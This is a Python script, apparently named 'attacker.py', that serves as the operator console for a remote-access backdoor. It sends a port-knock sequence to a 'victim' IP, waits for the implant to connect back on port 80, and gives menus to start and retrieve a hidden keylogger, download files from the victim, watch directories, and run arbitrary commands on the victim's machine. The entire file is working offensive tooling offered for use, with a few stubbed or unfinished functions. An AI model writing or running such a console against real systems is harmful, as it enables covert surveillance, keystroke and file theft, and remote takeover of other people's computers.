import ipaddress
from scapy.all import *
from scapy.layers.inet import IP, TCP
import socket
import os

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.connect(("8.8.8.8", 80))
my_ip = sock.getsockname()[0]
sock.close()

def knock(victimIP):
    send(IP(dst=victimIP)/TCP(sport=14369, dport=19634, flags='S'))
    send(IP(dst=victimIP)/TCP(sport=13436, dport=16343, flags='S'))

def is_ipv4(string):
    try:
        ipaddress.IPv4Network(string)
        return True
    except ValueError:
        return False


def keylog_menu():
    print("type the number of your selection")
    print("1: start keylogger")
    print("2: stop keylogger")
    print("3: get keylogger file")
    print("4: back")


def keyl():
    while True:
        keylog_menu()
        selection = input()
        if selection == "1":
            return "kstart"
        elif selection == "2":
            return "kstop"
        elif selection == "3":
            return "kget"
        elif selection == "4":
            return "-1"
        else:
            print(f"err {selection} not found")


def filet():
    fileLocation = input("enter file location or type 1 to go back\n")
    if fileLocation == "1":
        return "-1"
    return "fget " + fileLocation


def watch_menu():
    print("type the number of your selection")
    print("1: watch a file/directory")
    print("2: stop watching a file/directory")
    print("3: get results of watching")
    print("4: back")


def watch():
    while True:
        watch_menu()
        selection = input()
        if selection == "1":
            filedir = input("enter the file/dir path\n")
            return "wstart " + filedir
        elif selection == "2":
            return "wstop"
        elif selection == "3":
            return "wget"
        elif selection == "4":
            return "-1"
        else:
            print(f"err {selection} not found")


def executec():
    while True:
        command = input("type a command for the victim to execute or type 1 to go back\n")
        if command == "1":
            return "-1"
        return "e " + command


def print_menu():
    print("type the number of your selection")
    print("1: keylogger")
    print("2: file transfer")
    print("3: watch file/directory")
    print("4: execute command")
    print("5: exit")

def main_menu(victimIP):
    while True:
        print_menu()
        selection = input()
        if selection == "1":
            return keyl()
        elif selection == "2":
            return filet()
        elif selection == "3":
            return watch()
        elif selection == "4":
            return executec()
        elif selection == "5":
            print("exiting...")
            return "exit"
        else:
            print(f"err {selection} not found")

def get_file(fileName, connection):
    with client, client.makefile('rb') as clientfile:
        filename = clientfile.readline().strip().decode()
        length = int(clientfile.readline())
        print(f'Downloading {filename}:{length}...')
        # Read the data in chunks so it can handle large files.
        with open(filename, 'wb') as f:
            while length:
                chunk = min(length, 4096)
                data = clientfile.read(chunk)
                if not data: break  # socket closed
                f.write(data)
                length -= len(data)

        if length != 0:
            print('Invalid download.')
        else:
            print('Done.')

def get_directory(fileName, connection):
    pass


if __name__ == '__main__':
    try:
        victimIp = sys.argv[1]
    except Exception:
        print("please include the victim's IP address")
        print("example: attacker.py 192.168.0.1")
        exit()

    if(not is_ipv4(victimIp)):
        print("please use a valid IP address")
        print("example: attacker.py 192.168.0.1")

    knock(victimIp)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((my_ip, 80))
    sock.listen(1)
    print('Waiting for a client...')
    client, address = sock.accept()
    client_ip, client_port = address
    print(f'Client joined from {address}')
    with client:
        while True:
            command = main_menu(client_ip)
            while command == "-1":
                command = main_menu(client_ip)
            if command == "exit":
                break
            command_type = command.split()[0]
            client.sendall(str(command).encode())
            if command_type == "kget":
                get_file("/var/tmp/.key/log.txt", client)
            elif command_type == "fget":
                get_file(" ".join(command.split()[1:]), client)
            elif command_type == "wget":
                get_directory(" ".join(command.split()[1:]), client)
            else:
                data = client.recv(4096)
                print(data.decode())

